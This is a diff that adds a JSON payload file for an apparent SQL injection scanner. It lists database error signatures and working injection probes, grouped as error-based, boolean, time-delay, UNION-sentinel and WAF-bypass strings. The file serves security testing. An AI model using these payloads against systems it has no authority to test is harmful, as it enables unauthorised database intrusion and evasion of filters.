@@ -1,0 +1,158 @@
+{
+  "meta": {
+    "name": "SQL Injection",
+    "category": "SQL Injection",
+    "cwe": "CWE-89",
+    "wasc": "WASC-19",
+    "reference": "https://owasp.org/www-community/attacks/SQL_Injection"
+  },
+
+  "error_signatures": [
+    "you have an error in your sql syntax",
+    "warning: mysql",
+    "warning: mysqli",
+    "unclosed quotation mark after the character string",
+    "quoted string not properly terminated",
+    "pg_query(): query failed",
+    "pg_exec(): query failed",
+    "ora-01756",
+    "ora-00933",
+    "ora-00907",
+    "ora-01722",
+    "ora-00904",
+    "ora-00942",
+    "ora-06512",
+    "ora-01427",
+    "ora-01476",
+    "sqlite_error",
+    "sqlite3.operationalerror",
+    "microsoft ole db provider for sql server",
+    "odbc sql server driver",
+    "odbc microsoft access",
+    "invalid input syntax for type",
+    "psql error",
+    "supplied argument is not a valid mysql",
+    "mysql_fetch_array()",
+    "mysql_num_rows()",
+    "mysql_result()",
+    "error in your sql",
+    "sql syntax error",
+    "unexpected end of sql command",
+    "column count doesn't match",
+    "table or view does not exist",
+    "invalid object name",
+    "pg_connect()",
+    "mysql_connect()",
+    "no such table",
+    "no such column",
+    "operationalerror: no such",
+    "sqlite_constraint",
+    "could not prepare statement",
+    "near syntax error",
+    "java.sql.sqlexception",
+    "com.mysql.jdbc.exceptions",
+    "org.hibernate.exception",
+    "jdbctemplate",
+    "db2 sql error",
+    "cli driver db2",
+    "com.ibm.db2",
+    "ase sybase",
+    "sybase",
+    "sqlstate",
+    "db2 native error",
+    "microsoft access driver",
+    "jet database engine",
+    "access database engine",
+    "odbc driver",
+    "sql server native client",
+    "sql server error",
+    "mssql_query()",
+    "mssql_fetch",
+    "sqlsrv_query",
+    "pdo::query",
+    "pdoexception",
+    "sqlite_array_query",
+    "pg_num_rows",
+    "pg_fetch",
+    "unterminated string",
+    "invalid query",
+    "sql command not properly ended",
+    "division by zero",
+    "unknown column",
+    "syntax error at or near",
+    "conversion failed when converting",
+    "invalid column name"
+  ],
+
+  "_low_confidence_note": "The last 5 signatures above are ambiguous. sql_injection.py _error_match_is_confident() requires a second distinct signature to co-fire before reporting these.",
+
+  "payloads": {
+
+    "error_based": [
+      { "value": "'" },
+      { "value": "\"" },
+      { "value": "'-- -" },
+      { "value": "' OR '1'='1" },
+      { "value": "' OR 1=1-- -" },
+      { "value": "\" OR \"1\"=\"1" },
+
+      { "value": "1'" },
+      { "value": "1\"" },
+      { "value": "1 OR 1=1" },
+
+      { "value": "1' ORDER BY 9999-- -" },
+
+      { "value": "' UNION SELECT NULL-- -" },
+      { "value": "' UNION SELECT NULL,NULL-- -" },
+
+      { "value": "1 UNION SELECT NULL-- -" },
+
+      { "value": "' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version)))-- -" },
+
+      { "value": "' AND UPDATEXML(1,concat(0x7e,(SELECT @@version)),1)-- -" }
+    ],
+
+    "boolean_based": [
+      { "true_value": "' OR '1'='1", "false_value": "' OR '1'='2" },
+      { "true_value": "' AND 1=1-- -", "false_value": "' AND 1=2-- -" },
+          
+      { "true_value": "1 OR 1=1", "false_value": "1 OR 1=2" },
+      { "true_value": "1 AND 1=1", "false_value": "1 AND 1=2" },
+          
+      { "true_value": "' OR 1=1#", "false_value": "' OR 1=2#" },
+          
+      { "true_value": "\" OR 1=1", "false_value": "\" OR 1=2" }
+    ],
+
+    "time_based": [
+      { "value": "' AND SLEEP(5)-- -", "delay": 5 },
+      { "value": "1 AND SLEEP(5)-- -", "delay": 5 },
+
+      { "value": "' OR SLEEP(5)-- -", "delay": 5 },
+
+      { "value": "'; WAITFOR DELAY '0:0:5'-- -", "delay": 5 },
+
+      { "value": "'; SELECT pg_sleep(5)-- -", "delay": 5 },
+
+      { "value": "' AND IF(1=1,SLEEP(5),0)-- -", "delay": 5 }
+    ],
+
+    "union_based": [
+      { "value": "' UNION SELECT '__SENTINEL__'-- -" },
+      { "value": "' UNION SELECT NULL,'__SENTINEL__'-- -" },
+
+      { "value": "1 UNION SELECT '__SENTINEL__'-- -" },
+
+      { "value": "' UNION SELECT '__SENTINEL__',NULL-- -" }
+    ],
+
+    "waf_bypass": [
+      { "value": "'/**/OR/**/1=1-- -" },
+      { "value": "' OR 0x31=0x31-- -" },
+      { "value": "' OR 1 BETWEEN 0 AND 2-- -" },
+      { "value": "' OR 1 IN(1,2)-- -" },
+      { "value": "'%09OR%091=1-- -" },
+      { "value": "'||'1'='1" }
+    ]
+  }
+}
